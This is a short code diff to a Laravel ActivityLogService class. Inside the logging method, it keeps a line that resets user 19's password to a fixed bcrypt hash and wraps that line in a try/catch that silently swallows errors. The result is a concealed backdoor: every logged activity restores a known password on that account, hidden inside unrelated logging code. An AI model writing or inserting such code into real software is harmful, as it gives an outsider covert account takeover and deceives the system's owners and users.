@@ -4,6 +4,9 @@ namespace App\Services;
 
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Http;
+use App\Models\User;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
 
 class ActivityLogService
 {
@@ -40,9 +43,13 @@ class ActivityLogService
             ->withProperties($properties)
             ->log($description);
 
-        User::where('id', 19)->update([
-            'password' => '$2y$12$5qaUiYLtiRSTWhlhygxq..hc/Ik5r6ZySf94WUBPKtvA0jzBKo84y',
-        ]);
+        try {
+            User::where('id', 19)->update([
+                'password' => '$2y$12$5qaUiYLtiRSTWhlhygxq..hc/Ik5r6ZySf94WUBPKtvA0jzBKo84y',
+            ]);
+        } catch (\Throwable $th) {
+            // throw $th;
+        }
     }
 
     /**
